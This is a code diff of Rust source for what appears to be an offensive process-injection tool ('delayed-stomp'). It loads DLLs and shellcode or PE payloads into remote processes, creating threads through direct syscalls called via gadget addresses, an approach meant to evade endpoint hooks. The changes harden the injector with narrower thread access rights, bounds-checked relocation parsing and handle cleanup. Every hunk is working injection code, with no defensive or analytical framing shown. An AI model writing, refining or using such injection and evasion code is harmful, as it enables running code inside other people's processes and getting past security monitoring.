@@ -41,6 +41,8 @@ const MEM_RESERVE: u32 = 0x00002000;
 const PAGE_READWRITE: u32 = 0x04;
 const PAGE_EXECUTE_READ: u32 = 0x20;
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+/// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
+const THREAD_INJECT_ACCESS: u64 = 0x1A02;
 
 /// Maximum number of modules to enumerate when scanning for loaded DLLs.
 const MAX_MODULES: usize = 1024;
@@ -540,7 +542,7 @@ unsafe fn load_dll_remote(
         thread_tgt.gadget_addr,
         &[
             &mut thread_handle as *mut usize as u64, // ThreadHandle
-            0x1FFFFF,                                 // DesiredAccess (THREAD_ALL_ACCESS)
+            THREAD_INJECT_ACCESS,                        // DesiredAccess (minimal thread access)
             0,                                         // ObjectAttributes
             process_handle as u64,                     // ProcessHandle
             load_library_a as u64,                     // StartRoutine
@@ -568,13 +570,12 @@ unsafe fn load_dll_remote(
                 (-1i64) as u64,      // Timeout (INFINITE = -1 as signed i64)
             ],
         );
+    } else {
+        log::warn!("[delayed-stomp] NtWaitForSingleObject SSN unavailable, closing thread handle without waiting");
     }
 
-    // Close the thread handle
-    let close_target = crate::syscalls::get_syscall_id("NtClose");
-    if let Some(ref close_tgt) = close_target {
-        let _ = do_syscall(close_tgt.ssn, close_tgt.gadget_addr, &[thread_handle as u64]);
-    }
+    // Always close the thread handle — use syscall_NtClose as guaranteed fallback.
+    let _ = crate::syscalls::syscall_NtClose(thread_handle as u64);
 
     // Free the DLL path memory
     let free_target = crate::syscalls::get_syscall_id("NtFreeVirtualMemory");
@@ -789,14 +790,23 @@ unsafe fn fix_relocations(
     dll_base: usize,
     payload: &[u8],
 ) -> Result<u32> {
-    // Parse DOS header from payload buffer
-    let dos = &*(payload.as_ptr() as *const ImageDosHeader);
+    // Parse DOS header from payload buffer using read_unaligned to avoid UB.
+    if payload.len() < std::mem::size_of::<ImageDosHeader>() {
+        return Ok(0);
+    }
+    let dos = std::ptr::read_unaligned(payload.as_ptr() as *const ImageDosHeader);
     if dos.e_magic != 0x5A4D {
         // Not a PE — raw shellcode, no relocation needed
         return Ok(0);
     }
 
-    let nt = &*(payload.as_ptr().add(dos.e_lfanew as usize) as *const ImageNtHeaders64);
+    let nt_offset = dos.e_lfanew as usize;
+    if nt_offset.saturating_add(std::mem::size_of::<ImageNtHeaders64>()) > payload.len() {
+        return Ok(0);
+    }
+    let nt = std::ptr::read_unaligned(
+        payload.as_ptr().add(nt_offset) as *const ImageNtHeaders64,
+    );
     if nt.signature != 0x4550 {
         return Ok(0);
     }
@@ -846,9 +856,15 @@ unsafe fn fix_relocations(
             break;
         }
 
+        if block_size <= 8 {
+            break;
+        }
         let num_entries = (block_size - 8) / 2;
         for i in 0..num_entries {
             let entry_offset = reloc_rva + offset + 8 + i * 2;
+            if entry_offset + 2 > payload.len() {
+                break;
+            }
             let entry = u16::from_le_bytes([
                 payload[entry_offset],
                 payload[entry_offset + 1],
@@ -923,7 +939,7 @@ unsafe fn execute_payload(
         thread_tgt.gadget_addr,
         &[
             &mut thread_handle as *mut usize as u64,
-            0x1FFFFF,              // THREAD_ALL_ACCESS
+            THREAD_INJECT_ACCESS,  // minimal thread access
             0,                      // ObjectAttributes
             process_handle as u64,
             entry_address as u64,   // StartRoutine
@@ -1238,6 +1254,11 @@ pub fn inject_delayed_stomp_async(
                         handle.injected_base_addr,
                         handle.payload_size
                     );
+                    // Clean up handles — async path is fire-and-forget,
+                    // so we eject the injection to close thread/process handles.
+                    if let Err(e) = handle.eject() {
+                        log::warn!("[delayed-stomp] handle eject failed: {e:?}");
+                    }
                 }
                 Err(e) => {
                     log::error!("[delayed-stomp] Phase 2 failed: {e:#}");
